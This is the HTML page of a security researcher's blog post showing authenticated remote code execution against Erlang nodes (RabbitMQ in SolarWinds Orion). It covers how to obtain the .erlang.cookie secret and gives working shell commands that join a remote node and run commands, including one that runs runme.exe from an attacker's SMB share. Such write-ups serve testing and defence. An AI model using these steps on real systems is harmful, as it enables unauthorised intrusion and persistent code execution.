@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Erlang Authenticated Remote Code Execution - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Erlang Authenticated Remote Code Execution" />
+<meta property="og:description" content="Erlang is a programming language that I have tried to learn a few times in the past but never really dug in, that is, until recently.
+Erlang is an interesting language because it has &ldquo;built-in concurrency, distribution, and fault tolerance&rdquo;. To me, this means that it does job queuing and distributed tasks right out of the gate.
+A little bit of history I first started digging into Erlang again from an attackers point of view at BSides Philadelphia 2016, where I talked about SolarWinds ORION." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2018/erlang-arce/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2018-09-15T09:30:44-05:00" />
+<meta property="article:modified_time" content="2018-09-15T09:30:44-05:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Erlang Authenticated Remote Code Execution"/>
+<meta name="twitter:description" content="Erlang is a programming language that I have tried to learn a few times in the past but never really dug in, that is, until recently.
+Erlang is an interesting language because it has &ldquo;built-in concurrency, distribution, and fault tolerance&rdquo;. To me, this means that it does job queuing and distributed tasks right out of the gate.
+A little bit of history I first started digging into Erlang again from an attackers point of view at BSides Philadelphia 2016, where I talked about SolarWinds ORION."/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2018/erlang-arce/" /><link rel="prev" href="https://malicious.link/posts/2018/2018-kiwicon-hiring-list/" /><link rel="next" href="https://malicious.link/posts/2018/wifi-feature-request-wpa-handshakes/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Erlang Authenticated Remote Code Execution",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2018\/erlang-arce\/"
+        },"genre": "posts","keywords": "erlang, rce, solarwinds, rabbitmq","wordcount":  834 ,
+        "url": "https:\/\/malicious.link\/posts\/2018\/erlang-arce\/","datePublished": "2018-09-15T09:30:44-05:00","dateModified": "2018-09-15T09:30:44-05:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Rob Fuller"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Erlang Authenticated Remote Code Execution</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Rob Fuller</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2018-09-15">2018-09-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;834 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#a-little-bit-of-history">A little bit of history</a></li>
+        <li><a href="#erlnag-nodes">Erlnag Nodes</a></li>
+        <li><a href="#the-cookie">The Cookie</a></li>
+        <li><a href="#the-cluster-name">The Cluster Name</a></li>
+        <li><a href="#the-node-port">The Node Port</a></li>
+        <li><a href="#remote-code-execution">Remote Code Execution</a></li>
+        <li><a href="#the-bad-and-the-worse">The Bad, and the worse&hellip;</a></li>
+        <li><a href="#the-ugly">The Ugly</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a href="http://erlang.org/faq/introduction.html" target="_blank" rel="noopener noreffer ">Erlang is a programming language</a> that I have tried to learn a few times in the past but never really dug in, that is, until recently.</p>
+<p>Erlang is an interesting language because it has <a href="http://erlang.org/faq/introduction.html" target="_blank" rel="noopener noreffer ">&ldquo;built-in concurrency, distribution, and fault tolerance&rdquo;</a>. To me, this means that it does job queuing and distributed tasks right out of the gate.</p>
+<h3 id="a-little-bit-of-history">A little bit of history</h3>
+<p>I first started digging into Erlang again from an attackers point of view at <a href="https://www.bsidesphilly.org/" target="_blank" rel="noopener noreffer ">BSides Philadelphia</a> 2016, where I talked about SolarWinds ORION. I was in the audience making last minute changes to my slides when I happened upon an &ldquo;erlang-node&rdquo; port (25672) listening. You can watch the video here (I&rsquo;ve jumped ahead to the part about the Erlang port):</p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/VXUPyod6vqw?start=240" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+<p>After I gave that talk, I asked around <a href="http://novahackers.blogspot.com/p/how-to-join-and-rules.html" target="_blank" rel="noopener noreffer ">NoVA Hackers</a>. Luckily one such individual did, and that&rsquo;s why I love what NoVA Hackers has grown into, but this post isn&rsquo;t about that.</p>
+<p>With a little bit of back and forth with what I was trying to accomplish, we worked out the needed requirements for code execution.</p>
+<h3 id="erlnag-nodes">Erlnag Nodes</h3>
+<p>Erlang uses &ldquo;Nodes&rdquo; to execution code. As far as I can tell (and I&rsquo;ll probably be corrected) but you must run a node to execute any Erlang code, so everything written in Erlang (RabbitMQ, CouchDB, etc.) must be running a node. Erlang nodes are identified by their hostname. For my SolarWinds box, it&rsquo;s <code>WIN-PM0ID6F0AHN</code>. This is the most straightforward piece of information to acquire for the authenticated RCE.</p>
+<h3 id="the-cookie">The Cookie</h3>
+<p>The Erlang cookie <strong>SHOULD</strong> be the hardest to acquire. It&rsquo;s essentially the shared secret password between nodes, and just a simple string. This cookie exists even if only a single node is spun up (such is the case for SolarWinds). It is most commonly stored in a file called <code>.erlang.cookie</code> with nothing in the file other than the string. You can find it in home directories, userprofiles, project files and such. On Linux, it begining with the <code>.</code> means that it&rsquo;s automatically a &ldquo;hidden&rdquo; file, but on Windows it doesn&rsquo;t mean much ;). RabbitMQ documents well where the key is located:</p>
+<ul>
+<li><a href="https://www.rabbitmq.com/clustering.html#erlang-cookie" target="_blank" rel="noopener noreffer ">https://www.rabbitmq.com/clustering.html#erlang-cookie</a></li>
+</ul>
+<p>Example <code>.erlang.cookie</code> file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">rabbit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>One Windows for Solar Winds it can be found in <strong>Program Data</strong>:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/2018/erlang_sw_cookie.png"
+        data-srcset="/images/2018/erlang_sw_cookie.png, /images/2018/erlang_sw_cookie.png 1.5x, /images/2018/erlang_sw_cookie.png 2x"
+        data-sizes="auto"
+        alt="/images/2018/erlang_sw_cookie.png"
+        title="/images/2018/erlang_sw_cookie.png" /></p>
+<h3 id="the-cluster-name">The Cluster Name</h3>
+<p>The cluster name is needed to join the cluster but this is more of a guessing game. However, luckily these are regularly named based on the service being offered. RabbitMQ in particular almost always has a cluster name of <code>rabbit</code>.</p>
+<h3 id="the-node-port">The Node Port</h3>
+<p>This is actually pretty interesting that I haven&rsquo;t dived into completely yet, but the port isn&rsquo;t specified or default. There is some sort of discovery process so no matter the port the nodes are running on Erlang is able t find it. In the case of SolarWinds Orion&rsquo;s RabbitMQ, its <code>25672</code> but I&rsquo;ve seen erlang nodes on a number of other ports, usually particular to the project it&rsquo;s being run for.</p>
+<h3 id="remote-code-execution">Remote Code Execution</h3>
+<p>A simple <code>apt install erlang</code> gets you ready for exectuion. Once installed you need to put your <code>.erlang.cookie</code> file in your home directory <code>~/</code>. You also need to resolve the hostname (Node name) you wil be connecting to.</p>
+<p>Then it&rsquo;s just running a couple commands:</p>
+<ul>
+<li><code>test</code> is the node name you&rsquo;ll be calling your attack box when connecting to the cluster</li>
+<li><code>rabbit</code> is the cluster name being connected to</li>
+<li><code>WIN-PM0ID6F0AHN</code> is the hostname I&rsquo;m connecting to the cluster via</li>
+</ul>
+<p><strong>Start up Erlang with <code>erl -sname test</code></strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@kali:~# erl -sname test
+</span></span><span class="line"><span class="cl">Erlang/OTP 18 [erts-7.3.1.2] [source] [64-bit] [async-threads:10] [kernel-poll:false]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Eshell V7.3.1.2  (abort with ^G)
+</span></span><span class="line"><span class="cl">(test@kali)1&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Connecting to the cluster (the period on the end of the commands important terminators)</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(test@kali)1&gt; net_kernel:connect(&#39;rabbit@WIN-PM0ID6F0AHN&#39;).
+</span></span><span class="line"><span class="cl">true
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If you get a <code>true</code> that means the connection was successful.</p>
+<p><strong>Code exeuction (starting calc of course)</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(test@kali)2&gt; erlang:spawn(&#39;rabbit@WIN-PM0ID6F0AHN&#39;,os,cmd,[&#34;calc.exe&#34;]).
+</span></span><span class="line"><span class="cl">&lt;6867.30570.461&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And so, like any good code execution attack, <code>calc.exe</code> is executed:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/2018/erlang_sw_calc.png"
+        data-srcset="/images/2018/erlang_sw_calc.png, /images/2018/erlang_sw_calc.png 1.5x, /images/2018/erlang_sw_calc.png 2x"
+        data-sizes="auto"
+        alt="/images/2018/erlang_sw_calc.png"
+        title="/images/2018/erlang_sw_calc.png" /></p>
+<p>On Windows of course you can even do SMB shares:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">erlang:spawn(&#39;rabbit@WIN-PM0ID6F0AHN&#39;,os,cmd,[&#34;\\\\192.168.80.69\\share\\runme.exe&#34;]).
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Exiting the <strong>Erlang Shell</strong> is done with the init::stop function:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(test@kali)3&gt; init:stop().
+</span></span><span class="line"><span class="cl">ok
+</span></span><span class="line"><span class="cl">(test@kali)4&gt; root@kali:~#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="warning-by-running-this-code-execution-method-you-are-running-a-node-as-well-as-as-long-as-you-have-the-connection-open-you-can-be-exploited-the-same-way-you-are-exploiting-the-remote-host">Warning: By running this code execution method you are running a node as well, as as long as you have the connection open, you can be exploited the same way you are exploiting the remote host.</h4>
+<h3 id="the-bad-and-the-worse">The Bad, and the worse&hellip;</h3>
+<p>In many Docker instances the <code>.erlang.cookie</code> file is statically assigned and easy to find in the code. This is incredibly dangerous to have a statically assigned Erlang cookie for anyone who uses your Docker image, however because Docker doesn&rsquo;t automatically expose ports from the docker instance, this is actually a better scenario in many cases than running the erlang project without containers.</p>
+<p>This is not always the case and just like <a href="https://www.itnews.com.au/news/passwords-ssh-keys-exposed-on-github-330152" target="_blank" rel="noopener noreffer ">private keys on github</a>, really easy to find:</p>
+<p>Searching for <code>.erlang.cookie</code> on Github:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/2018/erlang_github.png"
+        data-srcset="/images/2018/erlang_github.png, /images/2018/erlang_github.png 1.5x, /images/2018/erlang_github.png 2x"
+        data-sizes="auto"
+        alt="/images/2018/erlang_github.png"
+        title="/images/2018/erlang_github.png" /></p>
+<h3 id="the-ugly">The Ugly</h3>
+<p>Changing the Erlang Cookie is a pain, and usually very deep in the project or setup, so once you have the file, you have future proof code execution.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2018-09-15</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2018/erlang-arce/" data-title="Erlang Authenticated Remote Code Execution" data-via="mubix" data-hashtags="erlang,rce,solarwinds,rabbitmq"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2018/erlang-arce/" data-hashtag="erlang"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2018/erlang-arce/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2018/erlang-arce/" data-title="Erlang Authenticated Remote Code Execution"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2018/erlang-arce/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2018/erlang-arce/" data-title="Erlang Authenticated Remote Code Execution"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2018/erlang-arce/" data-title="Erlang Authenticated Remote Code Execution"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2018/erlang-arce/" data-title="Erlang Authenticated Remote Code Execution"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/erlang/">erlang</a>,&nbsp;<a href="/tags/rce/">rce</a>,&nbsp;<a href="/tags/solarwinds/">solarwinds</a>,&nbsp;<a href="/tags/rabbitmq/">rabbitmq</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2018/2018-kiwicon-hiring-list/" class="prev" rel="prev" title="2018 KiwiCon Hiring List"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>2018 KiwiCon Hiring List</a>
+            <a href="/posts/2018/wifi-feature-request-wpa-handshakes/" class="next" rel="next" title="Wifi Feature Request: WPA handshakes">Wifi Feature Request: WPA handshakes<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
